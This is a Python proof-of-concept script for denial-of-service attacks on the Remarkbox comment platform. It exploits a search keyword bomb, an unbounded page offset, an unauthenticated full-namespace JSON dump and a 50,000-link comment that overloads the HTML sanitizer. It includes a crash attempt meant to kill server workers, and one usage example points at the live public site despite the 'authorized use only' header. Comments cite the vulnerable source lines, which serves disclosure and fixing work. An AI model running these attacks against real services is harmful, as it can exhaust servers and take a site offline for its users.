#!/usr/bin/env python3
"""
CWE-407 Proof-of-Concept — Algorithmic Complexity DoS
Target: remarkbox

Usage:
    python3 poc-cwe407.py <base_url> <test>

Tests:
    search      /search keyword bomb (unauthenticated)
    page        ?page= offset bomb (unauthenticated)
    dump        /ns/{ns}/dump.json full-namespace dump (unauthenticated)
    comment     HTML bomb via POST /new (authenticated — provide session cookie)
    all         run all unauthenticated tests

AUTHORIZED USE ONLY. Run against your own dev instance.

Examples:
    python3 poc-cwe407.py http://localhost:6543 search
    python3 poc-cwe407.py https://remarkbox.com search
    python3 poc-cwe407.py http://localhost:6543 page
    python3 poc-cwe407.py http://localhost:6543 dump
    python3 poc-cwe407.py http://localhost:6543 all
"""

import sys
import time
import statistics
import urllib.request
import urllib.parse
import urllib.error

# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------

def get(url, headers=None, timeout=120):
    req = urllib.request.Request(url, headers=headers or {})
    t0 = time.monotonic()
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read()
            elapsed = time.monotonic() - t0
            return resp.status, elapsed, len(body)
    except urllib.error.HTTPError as e:
        elapsed = time.monotonic() - t0
        body = e.read()
        return e.code, elapsed, len(body)
    except Exception as e:
        elapsed = time.monotonic() - t0
        return 0, elapsed, 0


def post(url, data, headers=None, timeout=120):
    if isinstance(data, dict):
        data = urllib.parse.urlencode(data).encode()
    h = {"Content-Type": "application/x-www-form-urlencoded"}
    if headers:
        h.update(headers)
    req = urllib.request.Request(url, data=data, headers=h, method="POST")
    t0 = time.monotonic()
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read()
            elapsed = time.monotonic() - t0
            return resp.status, elapsed, len(body)
    except urllib.error.HTTPError as e:
        elapsed = time.monotonic() - t0
        body = e.read()
        return e.code, elapsed, len(body)
    except Exception as e:
        elapsed = time.monotonic() - t0
        return 0, elapsed, 0


def row(label, status, elapsed, body_len):
    flag = "  <-- SLOW" if elapsed > 10 else ""
    print(f"  {label:<45s}  HTTP {status}  {elapsed:7.2f}s  {body_len:>9d} bytes{flag}")


def header(title):
    print()
    print("=" * 75)
    print(f"  {title}")
    print("=" * 75)
    print(f"  {'payload':<45s}  {'status':<9s}  {'time':>7s}  {'body':>14s}")
    print("-" * 75)


# ---------------------------------------------------------------------------
# PoC 1: /search keyword bomb — CVE candidate
# ---------------------------------------------------------------------------
#
# Root cause: remarkbox/views/list_nodes.py:151
#   get_root_nodes_by_keywords(dbsession, keywords.split(" "), request.namespace)
#
# Per keyword: SELECT * FROM node WHERE data ILIKE '%keyword%'  (full table scan)
# Results accumulate in a Python list with no LIMIT.
# Sort at end: O(n log n) over entire accumulated result set.
#
# Complexity: O(k * n) queries + O(k*n log k*n) sort
#   k = keyword count (user-controlled, no cap)
#   n = matching nodes per keyword (unbounded)
#
# Attack: send k=500 keywords consisting of common characters
#         each fires a full table scan; worker CPU saturates.

def poc_search(base, namespace=None):
    header("PoC 1: /search keyword bomb  [UNAUTHENTICATED]")

    if namespace:
        url = base.rstrip("/") + f"/ns/{namespace}/search"
    else:
        # remarkbox also exposes /search at top level
        url = base.rstrip("/") + "/search"

    timings = []
    for n in [1, 5, 10, 25, 50, 100, 200, 500]:
        # "the" is 3 chars, matches most English comment bodies
        payload = " ".join(["the"] * n)
        qs = urllib.parse.urlencode({"keywords": payload})
        status, elapsed, body_len = get(f"{url}?{qs}")
        timings.append((n, elapsed))
        row(f"{n:>4d}x 'the'", status, elapsed, body_len)

    if len(timings) >= 2:
        baseline = timings[0][1]
        worst = timings[-1][1]
        ratio = worst / baseline if baseline > 0 else float("inf")
        print(f"\n  baseline (1 keyword): {baseline:.2f}s")
        print(f"  worst (500 keywords): {worst:.2f}s")
        print(f"  ratio: {ratio:.1f}x  {'[CONFIRMED CWE-407]' if ratio > 5 else '[marginal]'}")

    # single-shot crash attempt
    print()
    print("  Crash attempt: 2000-keyword query")
    payload = " ".join(["a"] * 2000)
    qs = urllib.parse.urlencode({"keywords": payload})
    status, elapsed, body_len = get(f"{url}?{qs}", timeout=180)
    row("2000x 'a'", status, elapsed, body_len)
    if status == 0:
        print("  [CRASH] No response / connection reset — worker likely killed by RSS limit")
    elif status == 502 or status == 503:
        print("  [CRASH] 5xx — uWSGI worker restarted or queue full")
    elif elapsed > 30:
        print("  [CRASH] >30s response — worker thread fully saturated")


# ---------------------------------------------------------------------------
# PoC 2: ?page= offset DoS — CVE candidate
# ---------------------------------------------------------------------------
#
# Root cause: remarkbox/__init__.py:512
#   page_number = int(request.params.get("page", 1))  # no upper bound
#   page_offset  = (page_number - 1) * page_size       # page_size default 100
#
# Query issued: SELECT ... LIMIT 100 OFFSET <arbitrary>
# SQLite (and most RDBMS) must skip OFFSET rows before returning LIMIT rows.
# OFFSET 1e10 = full table scan discarding 10 billion rows.
#
# Complexity: O(offset) per request
#
# Attack: single request with page=9999999 serialises DB for seconds.

def poc_page(base, namespace=None):
    header("PoC 2: ?page= offset bomb  [UNAUTHENTICATED]")

    if namespace:
        url = base.rstrip("/") + f"/ns/{namespace}/nodes"
    else:
        ns = urllib.parse.urlparse(base).hostname or "local"
        url = base.rstrip("/") + f"/ns/{ns}/nodes"

    for page in [1, 10, 100, 1_000, 10_000, 100_000, 1_000_000, 10_000_000]:
        status, elapsed, body_len = get(f"{url}?page={page}")
        row(f"page={page:>12,d}  (OFFSET {(page-1)*100:>14,d})", status, elapsed, body_len)

    print()
    print(f"  PoC URL: {url}?page=9999999")
    print("  NOTE: if elapsed grows with page → confirmed OFFSET DoS")


# ---------------------------------------------------------------------------
# PoC 3: /ns/{ns}/dump.json — CVE candidate
# ---------------------------------------------------------------------------
#
# Root cause: remarkbox/models/namespace.py:427
#   dict_dump property iterates self.roots → for each root iterates root.children
#   No pagination, no limit. Full namespace serialized to JSON in one shot.
#   Each child access may trigger lazy-load ORM queries.
#
# Complexity: O(r * n) + JSON serialization
#   r = root nodes, n = child nodes per root
#
# Attack: attacker creates namespace with many nodes, then hammers dump endpoint.
# Even without attack setup, large existing namespaces expose this.

def poc_dump(base, namespace=None):
    header("PoC 3: /ns/{ns}/dump.json full dump  [UNAUTHENTICATED]")

    if namespace is None:
        namespace = urllib.parse.urlparse(base).hostname or "local"

    url = base.rstrip("/") + f"/ns/{namespace}/dump.json"

    times = []
    for i in range(5):
        status, elapsed, body_len = get(url)
        times.append(elapsed)
        row(f"request #{i+1}", status, elapsed, body_len)

    print(f"\n  5-run stats: median={statistics.median(times):.2f}s  max={max(times):.2f}s  min={min(times):.2f}s")
    print(f"  PoC URL: {url}")
    print("  Impact scales linearly with node count in namespace.")


# ---------------------------------------------------------------------------
# PoC 4: HTML comment bomb — CVE candidate (authenticated)
# ---------------------------------------------------------------------------
#
# Root cause: remarkbox/lib/sanitize_html.py:131-139
#   conditional_tag_filter: nested find_all() per tag type
#   protect_links: find_all("a") — O(n) per link count
#   render.py: html5lib parser slow on deeply nested/wide HTML
#
# Complexity: O(m * n) where m = tag type count, n = total DOM nodes
#
# Attack: post comment with 50,000 <a href="..."> tags.
# sanitize_html must find_all("a") → 50,000 iterations.
# html5lib must parse malformed/deep HTML tree.
#
# Requires: valid session cookie (authenticated user)

def poc_comment_bomb(base, namespace, session_cookie, node_id):
    header("PoC 4: HTML comment bomb  [AUTHENTICATED — session cookie required]")

    if not session_cookie:
        print("  SKIP: no session cookie provided")
        print("  To run: python3 poc-cwe407.py <base> comment <namespace> <node_id> <session_cookie>")
        return

    url = base.rstrip("/") + f"/embed/ns/{namespace}/{node_id}"

    # Build HTML with 50,000 anchor tags
    # html5lib + BeautifulSoup find_all("a") + protect_links() = O(50000)
    n_links = 50_000
    link_block = '<a href="https://example.com">x</a>' * n_links
    comment_body = f"timing test {link_block}"

    print(f"  Posting comment with {n_links:,} anchor tags to {url}")
    print(f"  Expected server-side: html5lib parse + find_all('a') = O({n_links:,}) iterations")
    print()

    status, elapsed, body_len = post(
        url,
        {"data": comment_body, "csrf_token": ""},  # csrf may reject — timing still relevant
        headers={"Cookie": session_cookie},
    )
    row(f"{n_links:,} anchor tags", status, elapsed, body_len)

    if elapsed > 5:
        print("  [IMPACT] >5s processing — sanitizer O(n) confirmed")
    if status == 0:
        print("  [CRASH] Connection reset — worker killed mid-request")


# ---------------------------------------------------------------------------
# dispatch
# ---------------------------------------------------------------------------

def usage():
    print(__doc__)
    print("Available tests: search, page, dump, comment, all")
    print()
    print("Examples:")
    print("  python3 poc-cwe407.py http://localhost:6543 search")
    print("  python3 poc-cwe407.py http://localhost:6543 page")
    print("  python3 poc-cwe407.py http://localhost:6543 dump myNamespace")
    print("  python3 poc-cwe407.py http://localhost:6543 comment myNS nodeId 'session=abc123'")


if __name__ == "__main__":
    if len(sys.argv) < 3:
        usage()
        sys.exit(1)

    base = sys.argv[1]
    test = sys.argv[2]
    namespace = sys.argv[3] if len(sys.argv) > 3 else None

    if test == "search":
        poc_search(base, namespace)
    elif test == "page":
        poc_page(base, namespace)
    elif test == "dump":
        poc_dump(base, namespace)
    elif test == "comment":
        node_id = sys.argv[4] if len(sys.argv) > 4 else None
        cookie  = sys.argv[5] if len(sys.argv) > 5 else None
        if not namespace or not node_id:
            print("Usage: poc-cwe407.py <base> comment <namespace> <node_id> [session_cookie]")
            sys.exit(1)
        poc_comment_bomb(base, namespace, cookie, node_id)
    elif test == "all":
        poc_search(base, namespace)
        poc_page(base, namespace)
        poc_dump(base, namespace)
    else:
        print(f"Unknown test: {test}")
        usage()
        sys.exit(1)

    print()
    print("Done.")
